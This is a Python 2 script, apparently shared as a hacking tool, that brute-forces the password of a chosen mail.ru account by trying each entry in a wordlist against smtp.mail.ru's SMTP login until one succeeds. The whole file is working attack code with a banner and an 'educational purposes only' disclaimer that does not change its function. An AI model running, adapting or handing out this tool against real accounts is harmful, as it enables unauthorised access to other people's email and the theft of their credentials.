#!/usr/bin/env python
# script creator : L0V3R IN MYANMAR
# only brutefore mail.ru :P
# Date : 11,4,2016
# Only for educational purposes 

import smtplib
import sys
import socket
import time

def logo():
	print '''
                             _      ___                   _             
                         o  | |    / (_)                 | |            
         _  _  _    __,     | |   |      ,_    __,   __  | |   _   ,_   
        / |/ |/ |  /  |  |  |/    |     /  |  /  |  /    |/_) |/  /  |  
          |  |  |_/\_/|_/|_/|__/   \___/   |_/\_/|_/\___/| \_/|__/   |_/
	                                                                      
	                                                        Version : 1
	'''
def warning():
	print '\033[1;31mThis Program is only for educational purposes only,\nUse at your own risk. :) \nGood Luck! \033[0m\n'
def main():
	global mail
	try:
		try:
			passfile = open(passwordfile, 'r')
			passwords = passfile.readlines()
			t = 0
			while t < len(passwords):
				passwords[t] = passwords[t].strip()
				t += 1
		except IOError:
			print "[!] Check you password file name !."
			sys.exit(1)

		print '[*] Setting up mail server .'
		try:	
			mail = smtplib.SMTP('smtp.mail.ru')
		except socket.gaierror,e:
			print e
			sys.exit(1)
		mail.ehlo()
		mail.starttls()
		logo()
		warning()
		print "Total passwords : ", len(passwords)
		print '[*] Mail : ', email
		for password in passwords:
			crack(password)
	except KeyboardInterrupt:
		print '[!] Exiting . . .'
		mail.close()
		sys.exit(1)

	mail.close()
def crack(password):
	global mail
	try:
		sys.stdout.write("\rTesting password with : %s                    " % password)
		sys.stdout.flush()
		mail.login(email,password.replace("\n" ,''))
		print '\nPassword Found : ' , password
		mail.close()
		sys.exit(1)
	except smtplib.SMTPAuthenticationError, e:
		pass
	except smtplib.SMTPServerDisconnected, e:
		mail = smtplib.SMTP('smtp.mail.ru')

if __name__ == '__main__':
	try:
		email = raw_input("Enter mail : ")
		if not email:
			sys.exit(1)
		passwordfile = raw_input("Password File name : ")
		if not passwordfile:
			sys.exit(1)
		main()
	except KeyboardInterrupt,e:
		sys.exit(1)